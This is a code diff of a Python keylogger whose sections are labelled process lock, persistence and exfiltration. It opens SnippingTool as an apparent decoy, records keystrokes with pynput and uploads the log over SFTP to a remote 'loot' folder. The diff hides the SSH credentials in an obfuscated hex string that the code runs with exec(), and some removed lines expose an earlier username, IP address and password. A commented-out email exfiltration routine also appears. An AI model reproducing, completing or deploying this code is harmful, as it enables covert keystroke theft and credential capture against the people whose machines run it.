@@ -1,7 +1,5 @@
-### process lock ###
 import os
 import sys
-##import atexit
 
 os.startfile(r'C:\Windows\System32\SnippingTool.exe')
 
@@ -12,15 +10,6 @@ if os.path.exists(lockfilepath):
     sys.exit(1)
 with open(lockfilepath, "w"):
     pass
-
-##def remove_lock(signal_number=None, frame=None):
-##    try:
-##        os.remove(lockfilepath)
-##        print("Lock file removed.")
-##    except FileNotFoundError:
-##        print("Lock file already removed.")
-##
-##atexit.register(remove_lock)
 
 ### persistence ###
 import shutil
@@ -44,30 +33,21 @@ from pynput import keyboard
 ### exfiltration ###
 def sftp_func(filepath):
 
-##    l = """62203d2062797465732e66726f6d68657828225c75303033355c75303033305c75303033365c7\
-##5303033355c75303033365c75303033375c75303033365c75303033315c75303033375c75303033345c7\
-##5303033375c75303033375c75303033365c75303033395c75303033365c75303036355c75303033335c7\
-##5303033365c75303033335c75303033385c75303033335c753030333222292e6465636f646528290a612\
-##03d2062797465732e66726f6d68657828225c75303033365c75303036325c75303033365c75303033315\
-##c75303033365c75303036335c75303033365c753030333922292e6465636f646528290a63203d2062797\
-##465732e66726f6d68657828225c75303033335c75303033315c75303033335c75303033395c753030333\
-##35c75303033325c75303033325c75303036355c75303033335c75303033315c75303033335c753030333\
-##65c75303033335c75303033385c75303033325c75303036355c75303033335c75303033365c753030333\
-##35c75303033395c75303033325c75303036355c75303033335c753030333522292e6465636f64652829"""
+    # pass, user, ip > to hex > escape unicode chars
+    # b = "<remote ssh password>"
+    # a = "<remote ssh username>"
+    # c = "<server ip>"
 
-# pass, user, ip > to hex > escape unicode chars > hex block
-##    b = "Pegatwin682"
-    a = "kali"
-    c = "192.168.69.5"
+    l = "\u0036\u0032\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0032\u0036\u0035\u0036\u0064\u0036\u0066\u0037\u0034\u0036\u0035\u0032\u0030\u0037\u0033\u0037\u0033\u0036\u0038\u0032\u0030\u0037\u0030\u0036\u0031\u0037\u0033\u0037\u0033\u0037\u0037\u0036\u0066\u0037\u0032\u0036\u0034\u0033\u0065\u0032\u0032\u0030\u0061\u0036\u0031\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0032\u0036\u0035\u0036\u0064\u0036\u0066\u0037\u0034\u0036\u0035\u0032\u0030\u0037\u0033\u0037\u0033\u0036\u0038\u0032\u0030\u0037\u0035\u0037\u0033\u0036\u0035\u0037\u0032\u0036\u0065\u0036\u0031\u0036\u0064\u0036\u0035\u0033\u0065\u0032\u0032\u0030\u0061\u0036\u0033\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0033\u0036\u0035\u0037\u0032\u0037\u0036\u0036\u0035\u0037\u0032\u0032\u0030\u0036\u0039\u0037\u0030\u0033\u0065\u0032\u0032"
     
     success = False
     while success == False:
         try:
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            pub_key = os.path.join(os.path.dirname(sys.argv[0]), "id_ed25519.pub")
-##            exec(bytes.fromhex(l), globals())
-            client.connect(c, a, key_filename=pub_key, timeout=4)
+            # pub_key = os.path.join(os.path.dirname(sys.argv[0]), "id_ed25519.pub")
+            exec(bytes.fromhex(l), globals())
+            client.connect(c, 22, a, b, timeout=4)
             sftp = client.open_sftp()
 
             destination_path = f'/home/{a}/loot/{os.path.basename(filepath)}'
@@ -87,7 +67,7 @@ def sftp_func(filepath):
     ''' with email '''
     # def smtp_func(filepath):
 
-    #     inbox_name = 'emailname@proton.me'
+    #     inbox_name = 'emailname@domain.com'
     #     inbox_pword = 'password'
 
     #     msg = EmailMessage()
@@ -99,7 +79,7 @@ def sftp_func(filepath):
     #     msg.set_content(attachment)
 
     #     try:
-    #         with smtplib.SMTP("smtp.proton.me", 587) as s:
+    #         with smtplib.SMTP("smtp.domain.com", 587) as s:
     #             s.starttls()
     #             s.login(inbox_name, inbox_pword)
     #             s.send_message(msg)
@@ -200,9 +180,7 @@ def capture_keys():
         keyfile.write('\n')
 
     sftp_func(keyfilepath)
-
-
-
+    
 
 if __name__ == "__main__":
     
@@ -214,7 +192,7 @@ if __name__ == "__main__":
 
         threads = [t1, t2, t3]
         for thread in threads:
-##            thread.daemon = True
+            # thread.daemon = True
             thread.start()
         
         for thread in threads:
